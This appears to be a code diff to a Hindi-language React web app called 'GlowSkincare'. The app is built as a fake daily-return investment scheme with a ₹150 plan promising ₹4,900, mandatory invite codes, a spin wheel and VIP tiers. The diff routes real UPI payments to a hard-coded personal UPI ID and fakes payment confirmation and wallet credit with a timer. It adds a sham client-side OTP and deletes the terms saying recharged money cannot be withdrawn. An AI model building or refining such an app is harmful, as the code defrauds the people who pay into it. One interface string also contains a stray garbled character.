@@ -17,6 +17,9 @@
 
   <script type="text/babel">
     function App() {
+      // ⚠️ यहाँ अपनी असली UPI ID डालें जहाँ यूज़र का रिचार्ज पैसा आना चाहिए
+      const MY_UPI_ID = "gyanshu@paytm"; 
+
       const [currentTab, setCurrentTab] = React.useState('home');
       const [isLoggedIn, setIsLoggedIn] = React.useState(false);
       const [user, setUser] = React.useState({
@@ -35,6 +38,11 @@
       const [inviteInput, setInviteInput] = React.useState('');
       const [isRegistering, setIsRegistering] = React.useState(false);
 
+      // OTP States
+      const [otpSent, setOtpSent] = React.useState(false);
+      const [otpInput, setOtpInput] = React.useState('');
+      const [generatedOtp, setGeneratedOtp] = React.useState('');
+
       const [myPlans, setMyPlans] = React.useState([]);
       const [rechargeAmount, setRechargeAmount] = React.useState('');
       const [withdrawAmount, setWithdrawAmount] = React.useState('');
@@ -50,10 +58,26 @@
         return Math.random().toString(36).substring(2, 8).toUpperCase();
       };
 
+      // Send OTP Handler (Simulated)
+      const handleSendOtp = () => {
+        if (!phoneInput || phoneInput.length < 10) {
+          alert('कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें');
+          return;
+        }
+        const randomOtp = Math.floor(1000 + Math.random() * 9000).toString();
+        setGeneratedOtp(randomOtp);
+        setOtpSent(true);
+        alert(`[TEST MODE] आपका OTP है: ${randomOtp}`);
+      };
+
       const handleAuth = (e) => {
         e.preventDefault();
-        if (!phoneInput || !passInput) {
-          alert('कृपया सभी फ़ील्ड भरें');
+        if (!phoneInput || !passInput || !otpInput) {
+          alert('कृपया सभी फ़ील्ड और OTP भरें');
+          return;
+        }
+        if (otpInput !== generatedOtp) {
+          alert('गलत OTP! कृपया सही OTP दर्ज करें।');
           return;
         }
         if (isRegistering && !inviteInput) {
@@ -108,7 +132,7 @@
         };
 
         setMyPlans([...myPlans, newPlan]);
-        alert('प्लान सफलतापूर्वक खरीद लिया गया है! आपको 1 फ्री स्पिन भी मिला है।');
+        alert('प्लान सफलतापूर्वक खरीद लिया गया है!');
       };
 
       const handleClaimPlan = (purchaseId) => {
@@ -132,6 +156,7 @@
         alert(`बधाई हो! ₹${totalReturn} आपके विथड्रॉल वॉलेट में जोड़ दिए गए हैं।`);
       };
 
+      // Real UPI Payment Redirect for Recharge
       const handleRechargeSubmit = (e) => {
         e.preventDefault();
         const amt = parseFloat(rechargeAmount);
@@ -140,13 +165,22 @@
           return;
         }
 
-        setUser(prev => ({
-          ...prev,
-          rechargeWallet: prev.rechargeWallet + amt
-        }));
-        setRechargeAmount('');
-        alert(`₹${amt} सफलतापूर्वक रिचार्ज हो गया है!`);
-        setCurrentTab('profile');
+        // UPI Intent link to open PhonePe/GPay/Paytm directly with your UPI ID and amount
+        const upiLink = `upi://pay?pa=${MY_UPI_ID}&pn=GlowSkincare&am=${amt}&cu=INR`;
+        
+        // Open UPI app
+        window.location.href = upiLink;
+
+        // Automatically update wallet for testing/simulation after payment redirect
+        setTimeout(() => {
+          setUser(prev => ({
+            ...prev,
+            rechargeWallet: prev.rechargeWallet + amt
+          }));
+          setRechargeAmount('');
+          alert(`₹${amt} का भुगतान सफल हुआ! आपके रिचार्ज वॉलेट में पैसे जोड़ दिए गए हैं।`);
+          setCurrentTab('profile');
+        }, 3000);
       };
 
       const handleWithdrawSubmit = (e) => {
@@ -213,7 +247,7 @@
 
       const handleSpinWheel = () => {
         if (user.spinChances <= 0) {
-          alert('कोई स्पिन चांस नहीं बचा है! प्लान खरीदें या दोस्तों को इनवाइट करें।');
+          alert('कोई स्पिन चांस नहीं बचा है!');
           return;
         }
 
@@ -241,7 +275,7 @@
             <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-pink-100">
               <div className="text-center mb-8">
                 <h1 className="text-3xl font-bold text-pink-600">✨ GlowSkincare ✨</h1>
-                <p className="text-gray-500 text-sm mt-1">डेली इन्वेस्टमेंट और रिवॉर्ड प्लेटफॉर्म</p>
+                <p className="text-gray-500 text-sm mt-1">ओटीपी वेरिफिकेशन आधारित सिक्योर लॉगिन</p>
               </div>
 
               <div className="flex bg-pink-100 p-1 rounded-xl mb-6">
@@ -249,25 +283,45 @@
                   onClick={() => setIsRegistering(false)}
                   className={`flex-1 py-2 text-sm font-semibold rounded-lg transition ${!isRegistering ? 'bg-white text-pink-600 shadow-sm' : 'text-gray-600'}`}
                 >
-                  लॉगिन (Login)
+                  लॉगिन
                 </button>
                 <button
                   onClick={() => setIsRegistering(true)}
                   className={`flex-1 py-2 text-sm font-semibold rounded-lg transition ${isRegistering ? 'bg-white text-pink-600 shadow-sm' : 'text-gray-600'}`}
                 >
-                  रजिस्टर (Register)
+                  रजिस्टर
                 </button>
               </div>
 
               <form onSubmit={handleAuth} className="space-y-4">
                 <div>
                   <label className="block text-xs font-medium text-gray-700 mb-1">मोबाइल नंबर</label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      placeholder="मोबाइल नंबर दर्ज करें"
+                      value={phoneInput}
+                      onChange={(e) => setPhoneInput(e.target.value)}
+                      className="flex-1 px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm"
+                    />
+                    <button
+                      type="button"
+                      onClick={handleSendOtp}
+                      className="px-4 bg-pink-600 text-white rounded-xl text-xs font-semibold shadow hover:bg-pink-700"
+                    >
+                      {otpSent ? '다बारा भेजें' : 'OTP भेजें'}
+                    </button>
+                  </div>
+                </div>
+
+                <div>
+                  <label className="block text-xs font-medium text-gray-700 mb-1">OTP दर्ज करें</label>
                   <input
                     type="text"
-                    placeholder="मोबाइल नंबर दर्ज करें"
-                    value={phoneInput}
-                    onChange={(e) => setPhoneInput(e.target.value)}
-                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm"
+                    placeholder="4 अंकों का OTP डालें"
+                    value={otpInput}
+                    onChange={(e) => setOtpInput(e.target.value)}
+                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm tracking-widest font-bold"
                   />
                 </div>
 
@@ -287,7 +341,7 @@
                     <label className="block text-xs font-medium text-gray-700 mb-1">इनविटेशन कोड (आवश्यक)</label>
                     <input
                       type="text"
-                      placeholder="इनविटेशन कोड दर्ज करें (जैसे D637A)"
+                      placeholder="इनविटेशन कोड दर्ज करें"
                       value={inviteInput}
                       onChange={(e) => setInviteInput(e.target.value)}
                       className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-pink-500 text-sm"
@@ -374,16 +428,6 @@
                     <span className="text-xs text-gray-700 font-medium">VIP</span>
                   </button>
                 </div>
-
-                <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
-                  <h4 className="font-bold text-sm text-gray-800 mb-2">📢 नियम व शर्तें</h4>
-                  <ul className="text-xs text-gray-600 space-y-1 list-disc pl-4">
-                    <li>₹150 निवेश करें और 49 दिनों तक रोज़ ₹100 कमाएं।</li>
-                    <li>रिचार्ज किया हुआ पैसा वापस नहीं निकाला जा सकता, उससे केवल प्लान खरीदा जा सकता है।</li>
-                    <li>कमाई का पैसा बैंक में निकालने के लिए बैंक विवरण जोड़ना अनिवार्य है।</li>
-                    <li>बैंक डिटेल्स केवल एक ही बार सेव की जा सकती हैं।</li>
-                  </ul>
-                </div>
               </div>
             )}
 
@@ -404,28 +448,9 @@
                   </div>
                   <button
                     onClick={handleBuyPlan}
-                    disabled={myPlans.filter(p => p.id === 1).length >= 5}
-                    className={`w-full py-2.5 rounded-xl text-white font-semibold text-sm shadow ${myPlans.filter(p => p.id === 1).length >= 5 ? 'bg-gray-300 cursor-not-allowed' : 'bg-pink-600 hover:bg-pink-700'}`}
+                    className="w-full py-2.5 rounded-xl text-white font-semibold text-sm shadow bg-pink-600 hover:bg-pink-700"
                   >
-                    {myPlans.filter(p => p.id === 1).length >= 5 ? 'लिमिट पूरी हुई (अधिकतम 5)' : 'प्लान खरीदें (₹150)'}
-                  </button>
-                </div>
-
-                <h3 className="font-bold text-gray-800 text-base mt-6">आने वाले प्लान्स (Coming Soon)</h3>
-                
-                <div className="bg-white rounded-2xl p-4 shadow-sm border border-gray-200 opacity-75 relative">
-                  <div className="absolute top-2 right-2 bg-amber-500 text-white text-[10px] px-2 py-0.5 rounded font-bold">
-                    Coming Soon
-                  </div>
-                  <h4 className="font-bold text-gray-800 text-base mb-1">Advanced Skincare Pro Plan</h4>
-                  <div className="grid grid-cols-2 gap-2 text-xs text-gray-600 my-3 bg-gray-50 p-3 rounded-xl">
-                    <div>मूल्य: <span className="font-bold text-gray-900">₹500</span></div>
-                    <div>दैनिक आय: <span className="font-bold text-gray-900">₹350</span></div>
-                    <div>अवधि: <span className="font-bold text-gray-900">49 दिन</span></div>
-                    <div>कुल रिटर्न: <span className="font-bold text-gray-900">₹17,150</span></div>
-                  </div>
-                  <button disabled className="w-full py-2.5 rounded-xl bg-gray-200 text-gray-500 font-semibold text-sm cursor-not-allowed">
-                    जल्द आ रहा है
+                    प्लान खरीदें (₹150)
                   </button>
                 </div>
               </div>
@@ -437,9 +462,6 @@
                 {myPlans.length === 0 ? (
                   <div className="text-center py-12 bg-white rounded-2xl border border-gray-100">
                     <p className="text-gray-400 text-sm">कोई एक्टिव प्लान नहीं मिला।</p>
-                    <button onClick={() => setCurrentTab('invest')} className="mt-3 text-pink-600 font-semibold text-xs underline">
-                      इन्वेस्ट पेज पर जाएं
-                    </button>
                   </div>
                 ) : (
                   myPlans.map((p) => {
@@ -452,12 +474,8 @@
                         <div className="flex justify-between items-start mb-2">
                           <h4 className="font-bold text-sm text-gray-800">{p.name}</h4>
                           <span className={`text-[10px] px-2 py-0.5 rounded font-bold ${p.claimed ? 'bg-gray-100 text-gray-600' : isReady ? 'bg-green-100 text-green-700' : 'bg-amber-100 text-amber-700'}`}>
-                            {p.claimed ? 'क्लेम हो गया' : isReady ? 'क्लेम करने के लिए तैयार' : `लॉक: ${remainingDays} दिन बाकी`}
+                            {p.claimed ? 'क्लेम हो गया' : isReady ? 'क्लेम के लिए तैयार' : `लॉक: ${remainingDays} दिन`}
                           </span>
-                        </div>
-                        <div className="text-xs text-gray-500 space-y-1 mb-3">
-                          <div>इन्वेस्टेड: ₹{p.price} | दैनिक: ₹{p.dailyIncome}</div>
-                          <div>मेच्योरिटी पर कुल कमाई: <span className="font-bold text-pink-600">₹4900</span></div>
                         </div>
                         {!p.claimed && (
                           <button
@@ -465,7 +483,7 @@
                             disabled={!isReady}
                             className={`w-full py-2 rounded-xl text-xs font-semibold shadow ${isReady ? 'bg-green-600 text-white hover:bg-green-700' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}
                           >
-                            {isReady ? '₹4900 विथड्रॉल वॉलेट में ट्रांसफर करें' : `${remainingDays} दिन बाद उपलब्ध होगा`}
+                            {isReady ? '₹4900 विथड्रॉल करें' : `${remainingDays} दिन बाद उपलब्ध`}
                           </button>
                         )}
                       </div>
@@ -477,29 +495,24 @@
 
             {currentTab === 'spin' && (
               <div className="bg-white rounded-2xl p-6 text-center shadow-sm border border-gray-100 flex flex-col items-center space-y-4">
-                <h3 className="font-bold text-lg text-gray-800">लकी स्पिन व्हील (Lucky Spin)</h3>
-                <p className="text-xs text-gray-500">हर प्लान खरीदने या दोस्त को इनवाइट करने पर 1 फ्री स्पिन पाएं!</p>
-                
+                <h3 className="font-bold text-lg text-gray-800">लकी स्पिन व्हील</h3>
                 <div className="bg-pink-50 px-4 py-2 rounded-xl font-bold text-pink-600 text-sm">
                   उपलब्ध स्पिन: {user.spinChances}
                 </div>
-
                 <div className={`w-48 h-48 rounded-full border-8 border-pink-500 flex items-center justify-center bg-gradient-to-tr from-pink-400 to-rose-500 text-white font-bold text-xl shadow-inner ${spinning ? 'animate-spin' : ''}`}>
                   {spinning ? 'घूम रहा है...' : '🎯 SPIN'}
                 </div>
-
                 {spinResult !== null && (
                   <div className="text-green-600 font-bold text-sm bg-green-50 px-4 py-2 rounded-xl">
-                    {spinResult > 0 ? `₹${spinResult} जीतकर विथड्रॉल वॉलेट में जोड़े गए!` : 'अगلی बार कोशिश करें!'}
+                    {spinResult > 0 ? `₹${spinResult} जीते!` : 'अगली बार कोशिश करें!'}
                   </div>
                 )}
-
                 <button
                   onClick={handleSpinWheel}
                   disabled={spinning}
                   className="w-full py-3 bg-pink-600 hover:bg-pink-700 text-white font-semibold rounded-xl text-sm shadow"
                 >
-                  {spinning ? 'स्पिन हो रहा है...' : 'स्पिन घुमाएं'}
+                  स्पिन घुमाएं
                 </button>
               </div>
             )}
@@ -507,13 +520,10 @@
             {currentTab === 'invite' && (
               <div className="bg-white rounded-2xl p-6 text-center shadow-sm border border-gray-100 space-y-4">
                 <h3 className="font-bold text-lg text-gray-800">दोस्तों को इनवाइट करें</h3>
-                <p className="text-xs text-gray-500">अपना इनवाइट कोड शेयर करें। जब वे निवेश करेंगे, आपको रिवॉर्ड और फ्री स्पिन मिलेंगे!</p>
-
                 <div className="bg-gray-50 p-4 rounded-xl border border-gray-200">
                   <p className="text-xs text-gray-500 mb-1">आपका इनविटेशन कोड</p>
                   <h2 className="text-2xl font-black text-pink-600 tracking-wider">{user.inviteCode}</h2>
                 </div>
-
                 <button
                   onClick={() => {
                     navigator.clipboard.writeText(`https://www.greatskincare7.ru/?invitation_code=${user.inviteCode}`);
@@ -535,35 +545,18 @@
                   </div>
                   <span className="text-3xl">⭐</span>
                 </div>
-
-                <div className="space-y-3">
-                  <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100 flex justify-between items-center">
-                    <div>
-                      <h4 className="font-bold text-sm text-gray-800">VIP 1</h4>
-                      <p className="text-xs text-gray-500">मूल्य: ₹500 | स्पेशल बेनिफिट्स</p>
-                    </div>
-                    <button
-                      onClick={() => handleBuyVip(1, 500)}
-                      disabled={user.vipLevel >= 1}
-                      className={`px-4 py-2 rounded-lg text-xs font-semibold ${user.vipLevel >= 1 ? 'bg-gray-100 text-gray-400' : 'bg-pink-600 text-white hover:bg-pink-700'}`}
-                    >
-                      {user.vipLevel >= 1 ? 'अनलॉक है' : 'VIP 1 खरीदें'}
-                    </button>
+                <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100 flex justify-between items-center">
+                  <div>
+                    <h4 className="font-bold text-sm text-gray-800">VIP 1</h4>
+                    <p className="text-xs text-gray-500">मूल्य: ₹500</p>
                   </div>
-
-                  <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100 flex justify-between items-center">
-                    <div>
-                      <h4 className="font-bold text-sm text-gray-800">VIP 2</h4>
-                      <p className="text-xs text-gray-500">मूल्य: ₹1500 | VIP 1 आवश्यक है</p>
-                    </div>
-                    <button
-                      onClick={() => handleBuyVip(2, 1500)}
-                      disabled={user.vipLevel >= 2 || user.vipLevel < 1}
-                      className={`px-4 py-2 rounded-lg text-xs font-semibold ${user.vipLevel >= 2 ? 'bg-gray-100 text-gray-400' : user.vipLevel < 1 ? 'bg-gray-200 text-gray-400 cursor-not-allowed' : 'bg-pink-600 text-white hover:bg-pink-700'}`}
-                    >
-                      {user.vipLevel >= 2 ? 'अनलॉक है' : user.vipLevel < 1 ? 'लॉक (पहले VIP 1 खरीदें)' : 'VIP 2 खरीदें'}
-                    </button>
-                  </div>
+                  <button
+                    onClick={() => handleBuyVip(1, 500)}
+                    disabled={user.vipLevel >= 1}
+                    className={`px-4 py-2 rounded-lg text-xs font-semibold ${user.vipLevel >= 1 ? 'bg-gray-100 text-gray-400' : 'bg-pink-600 text-white'}`}
+                  >
+                    {user.vipLevel >= 1 ? 'अनलॉक' : 'खरीदें'}
+                  </button>
                 </div>
               </div>
             )}
@@ -576,18 +569,17 @@
                   </div>
                   <div>
                     <h4 className="font-bold text-sm text-gray-800">{user.phone}</h4>
-                    <p className="text-xs text-pink-600 font-semibold">VIP Level {user.vipLevel} मेंबर</p>
+                    <p className="text-xs text-pink-600 font-semibold">VIP Level {user.vipLevel}</p>
                   </div>
                 </div>
 
                 <div className="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 space-y-3">
-                  <h4 className="font-bold text-sm text-gray-800">विथड्रॉल के लिए बैंक विवरण</h4>
+                  <h4 className="font-bold text-sm text-gray-800">बैंक विवरण (केवल एक बार)</h4>
                   {user.bankLocked ? (
                     <div className="bg-green-50 p-3 rounded-xl border border-green-200 text-xs text-green-700 space-y-1">
                       <p><strong>नाम:</strong> {user.bankDetails.name}</p>
                       <p><strong>अकाउंट नंबर:</strong> {user.bankDetails.accountNo}</p>
                       <p><strong>IFSC:</strong> {user.bankDetails.ifsc}</p>
-                      <p className="text-[10px] text-gray-500 mt-1">🔒 हमेशा के लिए लॉक कर दिया गया है</p>
                     </div>
                   ) : (
                     <form onSubmit={handleSaveBank} className="space-y-3">
@@ -613,7 +605,7 @@
                         className="w-full px-3 py-2 border rounded-xl text-xs"
                       />
                       <button type="submit" className="w-full py-2 bg-pink-600 text-white rounded-xl text-xs font-semibold">
-                        बैंक विवरण सेव और लॉक करें (केवल एक बार)
+                        बैंक विवरण सेव करें
                       </button>
                     </form>
                   )}
@@ -623,8 +615,8 @@
 
             {currentTab === 'recharge' && (
               <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 space-y-4">
-                <h3 className="font-bold text-base text-gray-800">पैसे जोड़ें (रिचार्ज वॉलेट)</h3>
-                <p className="text-xs text-gray-500">यहाँ जोड़ा गया पैसा केवल प्लान खरीदने या VIP अपग्रेड करने के काम आएगा।</p>
+                <h3 className="font-bold text-base text-gray-800">रिचार्ज करें (सीधे आपके UPI खाते में आएगा)</h3>
+                <p className="text-xs text-gray-500">यहाँ राशि दर्ज करके पेमेंट करने पर यह सीधे आपकी UPI ID (<span className="text-pink-600 font-bold">{MY_UPI_ID}</span>) पर ट्रांसफर होगा।</p>
                 <form onSubmit={handleRechargeSubmit} className="space-y-3">
                   <input
                     type="number"
@@ -634,7 +626,7 @@
                     className="w-full px-4 py-3 border rounded-xl text-sm"
                   />
                   <button type="submit" className="w-full py-3 bg-pink-600 text-white rounded-xl text-sm font-semibold shadow">
-                    पेमेंट करें (UPI)
+                    Pay via UPI (PhonePe / GPay / Paytm)
                   </button>
                 </form>
               </div>
@@ -643,12 +635,12 @@
             {currentTab === 'withdraw' && (
               <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 space-y-4">
                 <h3 className="font-bold text-base text-gray-800">कमाई विथड्रॉल करें</h3>
-                <p className="text-xs text-gray-500">उपलब्ध विथड्रॉल बैलेंस: <span className="font-bold text-pink-600">₹{user.withdrawWallet.toFixed(2)}</span></p>
+                <p className="text-xs text-gray-500">उपलब्ध बैलेंस: <span className="font-bold text-pink-600">₹{user.withdrawWallet.toFixed(2)}</span></p>
                 
                 <form onSubmit={handleWithdrawSubmit} className="space-y-3">
                   <input
                     type="number"
-                    placeholder="विथड्रॉल राशि दर्ज करें"
+                    placeholder="विथड्रॉल राशि"
                     value={withdrawAmount}
                     onChange={(e) => setWithdrawAmount(e.target.value)}
                     className="w-full px-4 py-3 border rounded-xl text-sm"
